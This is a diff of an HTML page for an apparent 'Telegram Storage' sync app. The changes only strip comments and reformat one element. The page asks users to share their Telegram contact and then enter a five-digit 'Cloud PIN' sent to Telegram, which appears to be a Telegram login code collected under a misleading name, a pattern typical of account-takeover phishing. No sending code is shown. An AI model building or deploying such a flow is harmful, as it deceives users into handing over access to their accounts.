@@ -14,29 +14,23 @@
             <p>Sync your Telegram Storage</p>
         </div>
 
-        <!-- Phone Request Step -->
         <div id="step-phone" class="step active">
             <p>Tap the button below to securely login with your Telegram account.</p>
             <button onclick="requestContact()" class="btn-primary">📱 Continue with Telegram</button>
         </div>
 
-        <!-- OTP Request Step -->
         <div id="step-otp" class="step hidden">
             <p>We've sent a 5-digit Cloud PIN to your Telegram.</p>
             <input type="number" id="otp_input" placeholder="12345" class="input-box">
             <button onclick="verifyOTP()" class="btn-primary">Verify & Access</button>
         </div>
 
-        <!-- Success Dashboard -->
         <div id="step-success" class="step hidden">
             <h2 style="color: #4CAF50;">✅ Connected!</h2>
             <p>Your Personal Cloud is ready.</p>
-            <div class="dashboard">
-               <p>Storage: Syncing...</p>
-            </div>
+            <div class="dashboard"><p>Storage: Syncing...</p></div>
         </div>
 
-        <!-- 💡 Error ပြင်ဆင်ထားသော Loading Step -->
         <div id="step-loading" class="step hidden">
             <div class="spinner"></div>
             <p>Processing...</p>
